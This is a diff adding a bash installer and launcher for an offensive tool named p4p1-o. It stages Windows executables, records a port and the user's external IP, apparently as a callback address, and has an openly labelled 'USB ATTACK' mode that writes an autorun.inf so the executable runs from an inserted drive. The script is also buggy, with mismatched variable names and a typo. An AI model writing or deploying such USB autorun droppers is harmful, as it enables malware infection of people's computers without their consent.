@@ -1,0 +1,120 @@
+#!/bin/bash
+# *
+# *       _ _       _
+# *  _ __| | | _ __/ |
+# * | '_ \_  _| '_ \ |
+# * | .__/ |_|| .__/_|
+# * |_|       |_|
+# ***********************
+#
+# User guide to use p4p1-o
+# ./p4p1-o_UserGuide
+
+E_NOINSTALL=40
+E_EXEMISS=41
+E_NOCHOICE=42
+HOME_PATH=~/.p4p1-o/
+CONF_PATH=~/.p4p1-o/cfg/
+EXE_PATH=~/.p4p1-o/exe/
+DESKTOP_PATH=~/Desktop
+UN_FILE=~/.p4p1-o/cfg/un.cfg
+PORT_FILE=~/.p4p1-o/cfg/port.cfg
+IP_FILE=~/.p4p1-o/cfg/ip.cfg
+AUTORUN=autorun.inf
+W32EXE_PATH="~/.p4p1-o/exe/p4p1-o_32_V9.exe"
+W64EXE_PATH="~/.p4p1-o/exe/p4p1-o_64_V9.exe"
+EXT_IP=`dig +short myip.opendns.com @resolver1.opendns.com`
+UN=`cat $UN_FILE`
+
+
+echo "*       _ _       _"
+echo "*  _ __| | | _ __/ |"
+echo "* | '_ \\_  _| '_\\  |"
+echo "* | .__/ |_|| .__/_|"
+echo "* |_|       |_|"
+echo "*********welcome*********"
+
+if [ ! -d "$HOME_PATH" ]; then
+
+	echo "[*] First execution do you want to install?? (yes/no)"
+	read q
+
+	if [ "$q" = "no" ]; then
+		exit E_NOINSTALL
+	fi
+
+	echo "[*] Create paths"
+	mkdir -v $HOME_PATH
+	mkdir -v $CONF_PATH
+	mkdir -v $EXE_PATH
+
+	echo "[*] Hello new user please enter youre name:"
+	read name
+	echo name > $UN_FILE
+
+	if [[ ! -e "$W32EXE" && ! -e "$W64EXE" ]]; then
+		echo "[!] missing executables"
+		exit $E_EXEMISS
+	fi
+
+	echo "[*] Copy exe into $EXE_PATH"
+	mv -v $W32EXE $EXE_PATH
+	mv -v $W64EXE $EXE_PATH
+
+	echo "[*] Enter port for p4p1 (We recomend to use the default one 4441)"
+	read port
+	echo $port > $PORT_FILE
+
+	echo "[*] Do you want to use your external ip: $EXT_IP (yes/no)"
+	read q
+
+	if [ "$q"  = "no" ]; then
+		echo "[*] Enter custom ip"
+		read CUSTOM_IP
+		echo $CUSTOM_IP > $IP_FILE
+	else
+		echo "[*] Writing ip to file"
+		echo $EXT_IP > $IP_FILE
+	fi
+
+	echo "[*] Instalation finished thank you for using :)"
+
+else
+	echo "[*] Hy $UN."
+	echo "[*] Welcome to p4p1-o, This program was made by p4p1."
+	echo "[*] You have 2 modes please choose wich oen you want to use."
+	echo "[1] USB ATTACK"
+	echo "[2] I WILL FIGURE MY ATTACK MYSELF JUST CP THE EXE TO THE DESKTOP"
+	read q
+	if [ "$q" = "1" ]; then
+		echo "[*] Please enter the usb path"
+		read USB_PATH
+		echo "[autorun]" > $AUTORUN
+		echo "[*] is it a 32 bit or 64 bit?"
+		read q
+
+		cd $USB_PATH
+
+		if [ "$q" = "32" ];then
+			cp -v $W32EXE_PATH .
+			echo "open=$W32EXE" >> $AUTORUN
+		else
+			cp -v $W64EXE_PATH .
+			echo "open=$W64EXE" >> $AUTORUN
+		fi
+
+		echo "action=Start ShellRun-CD" >> $AUTORUN
+		echo "[*] Created autorun"
+		cp -v $AUTORUN .
+		echo "[*] Copied to file with exe and done!"
+
+	elif [ "$q" = "2" ]; then
+		echo "[*] Retreiving files ..."
+		cd $EXE_PATH
+		cp -v $W32EXE $DESKTOP_PATH
+		cp -v $W64EXEx $DESKTOP_PATH
+	else
+		echo "[!] Wrong choice"
+		exit $E_NOCHOICE
+	fi
+fi
